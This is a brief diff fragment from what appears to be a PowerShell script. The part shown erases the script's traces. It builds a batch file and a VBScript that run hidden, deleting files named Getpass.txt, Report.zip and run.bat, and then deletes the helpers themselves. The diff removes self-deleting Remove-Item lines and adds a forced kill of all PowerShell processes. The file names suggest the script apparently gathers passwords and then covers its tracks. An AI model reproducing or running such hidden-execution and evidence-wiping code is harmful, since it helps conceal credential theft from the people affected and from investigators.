@@ -2960,13 +2960,4 @@ catch
 }
 remove-item $fileSaveDir -recurse
 echo ping 127.1 -t 100 & del d:\Report.zip & del d:\run.bat & del d:\Getpass.txt > d:\start1.bat & echo createobject("wscript.shell").run "d:\start1.bat",0 > d:\start1.vbs & wscript d:\start1.vbs & del -force start1.bat & del -force start1.vbs
-
-remove-item 'D:\Report.zip'
-remove-item 'D:\run.bat'
-Remove-Item $MyINvocation.InvocationName
-ping 127.1 -t 200 >nul
-remove-item 'D:\Report.zip'
-remove-item 'D:\run.bat'
-Remove-Item $MyINvocation.InvocationName
-
-
+taskkill /IM -f powershell.exe
